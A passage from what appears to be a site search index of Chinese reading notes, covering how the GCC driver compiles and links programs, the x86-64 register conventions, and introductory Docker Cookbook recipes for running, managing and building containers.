driver\uff09\uff0c\u5b83\u4ee3\u8868\u7528\u6237\u5728\u9700\u8981\u65f6\u8c03\u7528\u8bed\u8a00\u9884\u5904\u7406\u5668\u3001\u7f16\u8bd1\u5668\u3001\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u3002\u6bd4\u5982\uff0c\u8981\u7528GNU\u7f16\u8bd1\u7cfb\u7edf\u6784\u9020\u793a\u4f8b\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c31\u8981\u901a\u8fc7\u5728shell\u4e2d\u8f93\u5165\u4e0b\u5217\u547d\u4ee4\u6765\u8c03\u7528GCC\u9a71\u52a8\u7a0b\u5e8f\uff1a 1 linux> gcc -Og -o prog main.c sum.c \u56fe7-2\u6982\u62ec\u4e86\u9a71\u52a8\u7a0b\u5e8f\u5728\u5c06\u793a\u4f8b\u7a0b\u5e8f\u4eceASCII\u7801\u6e90\u6587\u4ef6\u7ffb\u8bd1\u6210\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u65f6\u7684\u884c\u4e3a\u3002\uff08\u5982\u679c\u4f60\u60f3\u770b\u770b\u8fd9\u4e9b\u6b65\u9aa4\uff0c\u7528 -v \u9009\u9879\u6765\u8fd0\u884cGCC\u3002\uff09\u9a71\u52a8\u7a0b\u5e8f\u9996\u5148\u8fd0\u884cC\u9884\u5904\u7406\u5668\uff08cpp\uff09 1 \uff0c\u5b83\u5c06C\u7684\u6e90\u7a0b\u5e8fmain.c\u7ffb\u8bd1\u6210\u4e00\u4e2aASCII\u7801\u7684\u4e2d\u95f4\u6587\u4ef6main.i\uff1a 1 cpp [ other arguments ] main.c /tmp/main.i \u63a5\u4e0b\u6765\uff0c\u9a71\u52a8\u7a0b\u5e8f\u8fd0\u884cC\u7f16\u8bd1\u5668\uff08cc1\uff09\uff0c\u5b83\u5c06main.i\u7ffb\u8bd1\u6210\u4e00\u4e2aASCII\u6c47\u7f16\u8bed\u8a00\u6587\u4ef6main.s\uff1a 1 cc1 /tmp/main.i -Og [ other arguments ] -o /tmp/main.s \u7136\u540e\uff0c\u9a71\u52a8\u7a0b\u5e8f\u8fd0\u884c\u6c47\u7f16\u5668\uff08as\uff09\uff0c\u5b83\u5c06main.s\u7ffb\u8bd1\u6210\u4e00\u4e2a \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff08relocatable object file\uff09 main.o\uff1a 1 as [ other arguments ] -o /tmp/main.o /tmp/main.s \u9a71\u52a8\u7a0b\u5e8f\u7ecf\u8fc7\u76f8\u540c\u7684\u8fc7\u7a0b\u751f\u6210sum.o\u3002\u6700\u540e\uff0c\u5b83\u8fd0\u884c\u94fe\u63a5\u5668ld\uff0c\u5c06main.o\u548csum.o\u4ee5\u53ca\u4e00\u4e9b\u5fc5\u8981\u7684\u7cfb\u7edf\u76ee\u6807\u6587\u4ef6\u7ec4\u5408\u8d77\u6765\uff0c\u521b\u5efa\u4e00\u4e2a \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff08executable object file\uff09 prog\uff1a 1 ld -o prog [ system object file and args ] /tmp/main.o /tmp/sum.o shell\u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u4e00\u4e2a\u53eb\u505a \u52a0\u8f7d\u5668\uff08loader\uff09 \u7684\u51fd\u6570\uff0c\u5b83\u5c06\u53ef\u6267\u884c\u6587\u4ef6prog\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u590d\u5236\u5230\u5185\u5b58\uff0c\u7136\u540e\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u5f00\u5934\u3002","title":"7.1 \u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/linking/#72","text":"\u5411Linux LD\u7a0b\u5e8f\u8fd9\u6837\u7684 \u9759\u6001\u94fe\u63a5\u5668\uff08static linker\uff09 \u4ee5\u4e00\u7ec4\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4e3a\u8f93\u5165\uff0c\u751f\u6210\u4e00\u4e2a\u5b8c\u5168\u94fe\u63a5\u7684\u3001\u53ef\u4ee5\u52a0\u8f7d\u548c\u8fd0\u884c\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e3a\u8f93\u51fa\u3002\u8f93\u5165\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7531\u5404\u79cd \u5728\u67d0\u4e9bGCC\u7248\u672c\u4e2d\uff0c\u9884\u5904\u7406\u5668\u88ab\u96c6\u6210\u5230\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u3002 \u21a9","title":"7.2 \u9759\u6001\u94fe\u63a5"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/machine-level_representation_of_programs/","text":"3.3 \u6570\u636e\u683c\u5f0f \u7531\u4e8e\u662f\u4ece16\u4f4d\u4f53\u7cfb\u7ed3\u6784\u6269\u5c55\u621032\u4f4d\u7684\uff0cIntel\u7528\u672f\u8bed\u201c\u5b57\uff08word\uff09\u201d\u8868\u793a16\u4f4d\u6570\u636e\u7c7b\u578b\u3002\u56e0\u6b64\uff0c\u79f032\u4f4d\u6570\u4e3a\u201c\u53cc\u5b57\uff08double words\uff09\u201d\uff0c C\u58f0\u660e Intel\u6570\u636e\u7c7b\u578b \u6c47\u7f16\u4ee3\u7801\u540e\u7f00 char \u5b57\u8282 short \u5b57 int \u53cc\u5b57 3.4 \u8bbf\u95ee\u4fe1\u606f \u4e00\u4e2ax86-64\u7684\u4e2d\u592e\u5904\u7406\u5355\u5143\uff08CPU\uff09\u5305\u542b\u4e00\u7ec416\u4e2a\u5b58\u50a864\u4f4d\u503c\u7684 \u901a\u7528\u76ee\u7684\u5bc4\u5b58\u5668 \u3002\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u50a8\u6574\u6570\u6570\u636e\u548c\u6307\u9488\u3002 %rax %eax \u8fd4\u56de\u503c %rbx %ebx \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %rcx %ecx \u7b2c4\u4e2a\u53c2\u6570 %rdx %edx \u7b2c3\u4e2a\u53c2\u6570 %rsi %esi \u7b2c2\u4e2a\u53c2\u6570 %rdi %edi \u7b2c1\u4e2a\u53c2\u6570 %rbp %ebp \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %rsp %esp \u6808\u6307\u9488 %r8 %r8d \u7b2c5\u4e2a\u53c2\u6570 %r9 %r9d \u7b2c6\u4e2a\u53c2\u6570 %r10 %r10d \u8c03\u7528\u8005\u4fdd\u5b58 %r11 %r11d \u8c03\u7528\u8005\u4fdd\u5b58 %r12 %r12d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r13 %r13d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r14 %r14d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r15 %r15d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58","title":"\u7b2c3\u7ae0 \u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/machine-level_representation_of_programs/#33","text":"\u7531\u4e8e\u662f\u4ece16\u4f4d\u4f53\u7cfb\u7ed3\u6784\u6269\u5c55\u621032\u4f4d\u7684\uff0cIntel\u7528\u672f\u8bed\u201c\u5b57\uff08word\uff09\u201d\u8868\u793a16\u4f4d\u6570\u636e\u7c7b\u578b\u3002\u56e0\u6b64\uff0c\u79f032\u4f4d\u6570\u4e3a\u201c\u53cc\u5b57\uff08double words\uff09\u201d\uff0c C\u58f0\u660e Intel\u6570\u636e\u7c7b\u578b \u6c47\u7f16\u4ee3\u7801\u540e\u7f00 char \u5b57\u8282 short \u5b57 int \u53cc\u5b57","title":"3.3 \u6570\u636e\u683c\u5f0f"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/machine-level_representation_of_programs/#34","text":"\u4e00\u4e2ax86-64\u7684\u4e2d\u592e\u5904\u7406\u5355\u5143\uff08CPU\uff09\u5305\u542b\u4e00\u7ec416\u4e2a\u5b58\u50a864\u4f4d\u503c\u7684 \u901a\u7528\u76ee\u7684\u5bc4\u5b58\u5668 \u3002\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u50a8\u6574\u6570\u6570\u636e\u548c\u6307\u9488\u3002 %rax %eax \u8fd4\u56de\u503c %rbx %ebx \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %rcx %ecx \u7b2c4\u4e2a\u53c2\u6570 %rdx %edx \u7b2c3\u4e2a\u53c2\u6570 %rsi %esi \u7b2c2\u4e2a\u53c2\u6570 %rdi %edi \u7b2c1\u4e2a\u53c2\u6570 %rbp %ebp \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %rsp %esp \u6808\u6307\u9488 %r8 %r8d \u7b2c5\u4e2a\u53c2\u6570 %r9 %r9d \u7b2c6\u4e2a\u53c2\u6570 %r10 %r10d \u8c03\u7528\u8005\u4fdd\u5b58 %r11 %r11d \u8c03\u7528\u8005\u4fdd\u5b58 %r12 %r12d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r13 %r13d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r14 %r14d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 %r15 %r15d \u88ab\u8c03\u7528\u8005\u4fdd\u5b58","title":"3.4 \u8bbf\u95ee\u4fe1\u606f"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/","text":"1.11 \u5728docker\u4e2d\u8fd0\u884cHello World 1.11.1 \u95ee\u9898 \u4f60\u5df2\u7ecf\u62e5\u6709\u4e00\u53f0Docker\u4e3b\u673a\uff0c\u60f3\u8fd0\u884c\u4f60\u7684\u7b2c\u4e00\u4e2a\u5bb9\u5668\u3002\u4f60\u60f3\u5b66\u4e60\u5bb9\u5668\u7684\u4e0d\u540c\u751f\u547d\u5468\u671f\u3002\u6bd4\u5982\uff0c\u4f60\u60f3\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\u5e76\u5728\u5176\u4e2d\u6253\u5370hello world\u3002 1.11.2 \u89e3\u51b3\u65b9\u6848 \u4f60\u5df2\u7ecf\u89c1\u8fc7\u4e86 1 $ docker ps \u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u7528\u4e8e\u5217\u51fa\u6240\u6709\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u3002 \u9996\u5148\uff0c\u4f60\u60f3\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u3002\u8ba9\u6211\u4eec\u7acb\u5373\u5f00\u59cb\uff0c\u6267\u884c docker run \u547d\u4ee4\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker run busybox echo hello world \u5bb9\u5668\u6765\u6e90\u4e8e\u955c\u50cf\u3002 docker run \u547d\u4ee4\u4e0e\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u955c\u50cf\u3002 1.11.3 \u8ba8\u8bba \u5982\u679c\u5217\u51fa\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\uff0c\u4f60\u4f1a\u53d1\u73b0\u6ca1\u6709\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u3002\u8fd9\u662f\u56e0\u4e3a\u5bb9\u5668\u4e00\u65e6\u5b8c\u6210\u4e86\u5b83\u7684\u5de5\u4f5c\uff08\u8f93\u51fahello world\uff09\uff0c\u5c31\u505c\u6b62\u4e86\u3002\u4f46\u662f\u5bb9\u5668\u5e76\u6ca1\u6709\u5b8c\u5168\u6d88\u5931\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7 1 $ docker ps -a \u547d\u4ee4\u770b\u5230\u8fd9\u4e2a\u5bb9\u5668\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7 1 $ docker rm 8f7089b187e8 \u547d\u4ee4\u5c06\u8fd9\u4e2a\u5bb9\u5668\u6c38\u4e45\u5220\u9664\u3002\u8be5\u5bb9\u5668\u4f7f\u7528\u7684\u955c\u50cf\u5df2\u7ecf\u88ab\u4e0b\u8f7d\u5230\u4e86\u672c\u5730\uff0c 1 $ docker image \u547d\u4ee4\u5c06\u4f1a\u8f93\u51fa\u8fd9\u4e2a\u955c\u50cf\u7684\u4fe1\u606f\u3002 \u5982\u679c\u4efb\u4f55\u8fd0\u884c\u4e2d\u6216\u8005\u5df2\u7ecf\u505c\u6b62\u7684\u5bb9\u5668\u90fd\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u955c\u50cf\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7 1 $ docker rmi busybox \u547d\u4ee4\u6765\u5220\u9664\u8fd9\u4e2a\u955c\u50cf\u3002 \u8fd0\u884cecho\u547d\u4ee4\u867d\u7136\u5f88\u6709\u8da3\uff0c\u4f46\u662f\u83b7\u5f97\u4e00\u4e2a\u7ec8\u7aef\u4f1a\u8bdd\u4f1a\u66f4\u597d\u3002\u8981\u60f3\u5728\u5bb9\u5668\u4e2d\u8fd0\u884c /bin/bash \uff0c\u4f60\u9700\u8981\u4f7f\u7528 -t \u548c -i \u53c2\u6570\u6765\u83b7\u5f97\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u4f1a\u8bdd\uff0c\u4e0b\u9762\u4ee5\u4f7f\u7528Ubuntu\u955c\u50cf\u4e3a\u4f8b\u8fdb\u884c\u8bf4\u660e\u3002 1 $ docker run -t -i ubuntu:14.04 /bin/bash \u4f60\u4f1a\u770b\u5230Docker\u4e0b\u8f7d\u7684ubuntu:14.04\u955c\u50cf\u7531\u591a\u4e2a\u5c42\u7ec4\u6210\uff0c\u7136\u540e\u4f60\u5f97\u5230\u4e86\u4e00\u4e2a\u5bb9\u5668\u4e2droot\u6743\u9650\u7684\u4f1a\u8bdd\u3002\u63d0\u793a\u7b26\u4e5f\u663e\u793a\u4e86\u8fd9\u4e2a\u5bb9\u5668\u7684ID\u3002\u4e00\u65e6\u4f60\u63a8\u51fa\u8fd9\u4e2a\u7ec8\u7aef\uff0c\u8be5\u5bb9\u5668\u5c31\u4f1a\u505c\u6b62\u8fd0\u884c\uff0c\u5c31\u50cf\u6211\u4eec\u524d\u9762\u7684hello world\u4f8b\u5b50\u4e00\u6837\u3002 1.12 \u4ee5\u540e\u53f0\u65b9\u5f0f\u8fd0\u884cdocker\u5bb9\u5668 1.12.1 \u95ee\u9898 \u4f60\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u4ee5\u4ea4\u4e92\u65b9\u5f0f\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\uff0c\u4f46\u662f\u4f60\u60f3\u4ee5\u540e\u53f0\u65b9\u5f0f\u8fd0\u884c\u4e00\u4e2a\u670d\u52a1\u3002 1.12.2 \u89e3\u51b3\u65b9\u6848 \u4f7f\u7528 docker run \u7684 -d \u9009\u9879\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5c06\u4f1a\u5728\u5bb9\u5668\u4e2d\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684\u57fa\u4e8ePython\u7684HTTP\u670d\u52a1\u5668\u3002 1 $ docker run -d -p 1234 :1234 python:2.7 python -m SimpleHTTPServer 1234 1.12.3 \u8ba8\u8bba \u8fd9\u4e2a -d \u53c2\u6570\u4f1a\u8ba9\u5bb9\u5668\u5728\u540e\u53f0\u8fd0\u884c\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c exec \u547d\u4ee4\u6765\u542f\u52a8\u4e00\u4e2abash shell\uff0c\u518d\u6b21\u8fdb\u5165\u5230\u8be5\u5bb9\u5668\u4e2d\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker exec - ti 9 d7cebd75dcf / bin / bash \u5728\u5b98\u65b9\u6587\u6863\uff08 https://docs.docker.com/reference/run/ \uff09[^1]\u4e2d\u8fd8\u6709 docker run \u7684\u5176\u4ed6\u5f88\u591a\u9009\u9879\u3002 [^1] \u539f\u6587\u5982\u6b64\uff0c\u73b0\u5728\u5e94\u8be5\u662f https://docs.docker.com/engine/reference/commandline/run/ 1.13 \u521b\u5efa\u3001\u542f\u52a8\u3001\u505c\u6b62\u548c\u79fb\u9664\u5bb9\u5668 1.13.1 \u95ee\u9898 \u4f60\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u5e76\u8ba9\u5b83\u5728\u540e\u53f0\u8fd0\u884c\u3002\u4f60\u5e0c\u671b\u5b66\u4e60\u57fa\u672c\u547d\u4ee4\u6765\u7ba1\u7406\u5bb9\u5668\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u3002 1.13.2 \u89e3\u51b3\u65b9\u6848 \u4f7f\u7528 Docker \u547d\u4ee4\u884c\u7684 create \u3001 start \u3001 stop \u3001 kill \u548c rm \u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u5728\u8fd9\u4e9b\u547d\u4ee4\u540e\u9762\u52a0\u4e0a -h \u6216\u8005 \u2014\u2014h \u9009\u9879\u6765\u67e5\u770b\u5b83\u4eec\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u6216\u8005\u53ea\u8f93\u5165\u547d\u4ee4\u800c\u4e0d\u6307\u5b9a\u4efb\u4f55\u53c2\u6570\uff08\u6bd4\u5982 docker create \uff09\u3002 1.13.3 \u8ba8\u8bba \u5728\u8303\u4f8b 1.12 \u4e2d\uff0c\u4f60\u901a\u8fc7 docker run \u81ea\u52a8\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\u3002\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7 docker create \u547d\u4ee4\u6765\u521b\u5efa\u4e00\u4e2a\u5bb9\u5668\u3002\u7ee7\u7eed\u4f7f\u7528\u4e0a\u9762\u7b80\u5355\u7684HTTP\u670d\u52a1\u5668\u7684\u4f8b\u5b50\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u8fd9\u91cc\u6ca1\u6709\u6307\u5b9a -d \u9009\u9879\u3002\u5f53\u521b\u5efa\u5bb9\u5668\u4e4b\u540e\uff0c\u4f60\u9700\u8981\u8fd0\u884c docker start \u6765\u542f\u52a8\u8fd9\u4e2a\u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 $ docker create -P \u2014\u2014expose = 1234 python:2.7 python -m SimpleHTTPServer 1234 $ docker ps -a $ docker start a842945e2414 $ docker ps \u8981\u60f3\u505c\u6b62\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\uff0c\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 docker kill \uff08\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u53d1\u9001SIGKILL\u4fe1\u53f7\u5230\u5bb9\u5668\uff09\u6216\u8005 docker stop \uff08\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u53d1\u9001SIGTERM\u5230\u5bb9\u5668\uff0c\u5982\u679c\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u5bb9\u5668\u8fd8\u6ca1\u6709\u505c\u6b62\uff0c\u5219\u4f1a\u518d\u53d1\u9001SIGKILL\u4fe1\u53f7\u5f3a\u5236\u505c\u6b62\uff09\u3002\u8fd9\u4e24\u4e2a\u547d\u4ee4\u6700\u7ec8\u7684\u7ed3\u679c\u662f\u505c\u6b62\u5bb9\u5668\u7684\u8fd0\u884c\uff0c\u8be5\u5bb9\u5668\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728 docker ps \u8fd4\u56de\u7684\u8fd0\u884c\u4e2d\u5bb9\u5668\u5217\u8868\u4e2d\u3002\u4f46\u662f\uff0c\u5bb9\u5668\u8fd8\u6ca1\u6709\u5b8c\u5168\u6d88\u5931\uff08\u6bd4\u5982\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u8fd8\u5728\uff09\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 docker restart \u6765\u91cd\u542f\u8fd9\u4e2a\u5bb9\u5668\uff0c\u6216\u8005\u901a\u8fc7 docker rm \u79fb\u9664\u8fd9\u4e2a\u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 5 $ docker restart a842945e2414 $ docker ps $ docker kill a842945e2414 $ docker rm a842945e2414 $ docker ps -a \u5982\u679c\u4f60\u6709\u5f88\u591a\u505c\u6b62\u4e2d\u7684\u5bb9\u5668\u5f85\u5220\u9664\uff0c\u53ef\u4ee5\u5728\u4e00\u6761\u547d\u4ee4\u4e2d\u4f7f\u7528\u5d4c\u5957\u7684 shell \u6765\u5220\u9664\u6240\u6709\u5bb9\u5668\u3002 docker ps \u7684 -q \u9009\u9879\u53ea\u4f1a\u8fd4\u56de\u5bb9\u5668\u7684 ID \u4fe1\u606f\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker rm $( docker ps -a -q ) 1.14 \u4f7f\u7528Dockerfile\u6784\u5efaDocker\u955c\u50cf 1.14.1 \u95ee\u9898 \u4f60\u77e5\u9053\u4e86\u5982\u4f55\u4ece\u516c\u6709\u7684Docker registry\u4e0b\u8f7d\u955c\u50cf\uff0c\u4f46\u662f\u4f60\u60f3\u6784\u5efa\u81ea\u5df1\u7684Docker\u955c\u50cf\u3002 1.14.2 \u89e3\u51b3\u65b9\u6848 \u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\u3002Dockerfile\u662f\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u5b83\u8bb0\u8ff0\u4e86Docker\u6784\u5efa\u4e00\u4e2a\u955c\u50cf\u6240\u9700\u8981\u7684\u8fc7\u7a0b\uff0c\u5305\u62ec\u5b89\u88c5\u8f6f\u4ef6\u5305\u3001\u521b\u5efa\u6587\u4ef6\u5939\u3001\u5b9a\u4e49\u73af\u5883\u53d8\u91cf\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9b\u64cd\u4f5c\u3002\u5728\u7b2c2\u7ae0\u4e2d\u6211\u4eec\u4f1a\u5bf9Dockerfile\u548c\u6784\u5efa\u955c\u50cf\u505a\u66f4\u6df1\u5165\u7684\u8bf4\u660e\u3002\u672c\u8303\u4f8b\u4e2d\u53ea\u4f1a\u6d89\u53ca\u6784\u5efa\u955c\u50cf\u7684\u57fa\u672c\u6982\u5ff5\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\uff0c\u6211\u4eec\u5047\u8bbe\u4f60\u8981\u57fa\u4e8e busybox \u955c\u50cf\u521b\u5efa\u4e00\u4e2a\u65b0\u955c\u50cf\uff0c\u5e76\u5b9a\u4e49\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u3002busybox \u955c\u50cf\u662f\u4e00\u4e2a\u5305\u542b\u4e86 busybox\uff08 http://www.busybox.net/about.html \uff09\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684 Docker \u955c\u50cf\uff0c\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u5f88\u591a Unix \u5b9e\u7528\u5de5\u5177\u6253\u5305\u5230\u4e86\u4e00\u4e2a\u5355\u4e00\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002\u5728\u4e00\u4e2a\u7a7a\u6587\u4ef6\u5939\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a Dockerfile \u7684\u6587\u4ef6\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 FROM busybox ENV foo = bar \u53ef\u4ee5\u901a\u8fc7 docker build \u547d\u4ee4\u6765\u6784\u5efa\u4e00\u4e2a\u65b0\u955c\u50cf\uff0c\u5e76\u547d\u540d\u4e3a busybox2 \uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker build -t busybox2 . \u6784\u5efa\u7ed3\u675f\u4e4b\u540e\uff0c\u4f60\u5c31\u80fd\u901a\u8fc7 docker images \u547d\u4ee4\u770b\u5230\u65b0\u6784\u5efa\u7684\u955c\u50cf\u4e86\u3002\u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u65b0\u955c\u50cf\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\uff0c\u68c0\u67e5\u4e00\u4e0b\u5176\u4e2d\u662f\u5426\u6709\u4e00\u4e2a\u540d\u4e3a foo \u7684\u73af\u5883\u53d8\u91cf\uff0c\u5e76\u4e14\u5176\u503c\u88ab\u8bbe\u7f6e\u4e3a\u4e86 bar \uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 $ docker images $ docker run busybox2 env | grep foo 1.14.3 \u53c2\u8003 Dockerfile \u53c2\u8003\u6307\u5357\uff08 https://docs.docker.com/reference/builder/ \uff09[^1] \u7b2c 2 \u7ae0\uff0c\u5176\u4e2d\u4f1a\u5bf9\u521b\u5efa\u955c\u50cf\u548c\u5171\u4eab\u955c\u50cf\u8fdb\u884c\u8bf4\u660e [^1] \u73b0\u5728\u662f https://docs.docker.com/engine/reference/builder/ 1.15 \u5728\u5355\u4e00\u5bb9\u5668\u4e2d\u4f7f\u7528Supervisor\u8fd0\u884cWordPress 1.15.1 \u95ee\u9898 \u4f60\u5df2\u7ecf\u77e5\u9053\u4e86\u5982\u4f55\u5c06\u4e24\u4e2a\u5bb9\u5668\u94fe\u63a5\u5230\u4e00\u8d77\uff08\u53c2\u89c1\u8303\u4f8b1.16\uff09\uff0c\u4e0d\u8fc7\u4f60\u5e0c\u671b\u5728\u4e00\u4e2a\u5bb9\u5668\u4e2d\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u6240\u6709\u670d\u52a1\u3002\u4ee5\u8fd0\u884cWordPress\u4e3a\u4f8b\uff0c\u4f60\u60f3\u5728\u4e00\u4e2a\u5bb9\u5668\u4e2d\u540c\u65f6\u8fd0\u884cMySQL\u548cHTTPD\u670d\u52a1\u3002\u7531\u4e8eDocker\u8fd0\u884c\u7684\u662f\u524d\u53f0\u8fdb\u7a0b\uff0c\u6240\u4ee5\u4f60\u9700\u8981\u627e\u5230\u4e00\u79cd\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u201c\u524d\u53f0\u201d\u8fdb\u7a0b\u7684\u65b9\u5f0f\u3002 1.15.2 \u89e3\u51b3\u65b9\u6848 \u4f7f\u7528Supervisor\uff08 http://supervisord.org/index.html \uff09\u6765\u76d1\u63a7\u5e76\u8fd0\u884cMySQL\u548cHTTPD\u3002Supervisor\u4e0d\u662f\u4e00\u4e2ainit\u7cfb\u7edf\uff0c\u800c\u662f\u4e00\u4e2a\u7528\u6765\u63a7\u5236\u591a\u4e2a\u8fdb\u7a0b\u7684\u666e\u901a\u7a0b\u5e8f\u3002 \u672c\u8303\u4f8b\u662f\u4e00\u4e2a\u5728\u5bb9\u5668\u4e2d\u4f7f\u7528Supervisor\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u8fdb\u7a0b\u7684\u4f8b\u5b50\u3002\u4f60\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u7840\u5728\u4e00\u4e2aDocker\u955c\u50cf\u4e2d\u8fd0\u884c\u591a\u4e2a\u670d\u52a1\uff08\u6bd4\u5982SSH\u3001Nginx\uff09\u3002\u672c\u8303\u4f8b\u4e2d\uff0cWordPress\u7684\u914d\u7f6e\u662f\u4e00\u4e2a\u6700\u7cbe\u7b80\u7684\u53ef\u884c\u914d\u7f6e\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002 \u793a\u4f8b\u4e2d\u7684\u6587\u4ef6\u53ef\u4ee5\u5728GitHub\uff08 https://github.com/how2dock/docbook/tree/master/ch01/supervisor \uff09\u4e0b\u8f7d\u3002\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u5305\u62ec\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8\u865a\u62df\u673a\u7684Vagrantfile\uff0cDocker\u8fd0\u884c\u5728\u8be5\u865a\u62df\u673a\u4e2d\uff0c\u8fd8\u5305\u542b\u4e00\u4e2aDockerfile\u6765\u5b9a\u4e49\u8981\u521b\u5efa\u7684\u955c\u50cf\uff0c\u6b64\u5916\u8fd8\u6709\u4e00\u4e2aSupervisor\u7684\u914d\u7f6e\u6587\u4ef6\uff08supervisord.conf\uff09\u548c\u4e00\u4e2aWordPress\u7684\u914d\u7f6e\u6587\u4ef6\uff08wp-config.php\uff09\u3002 \u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528Vagrant\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u7684Dockerfile\u3001supervisord\u548cWordPress\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u81ea\u5df1\u7684Docker\u4e3b\u673a\u4e0a\u6765\u5b89\u88c5\u3002 \u4e3a\u4e86\u8fd0\u884cWordPress\uff0c\u4f60\u9700\u8981\u5b89\u88c5MySQL\u3001Apache 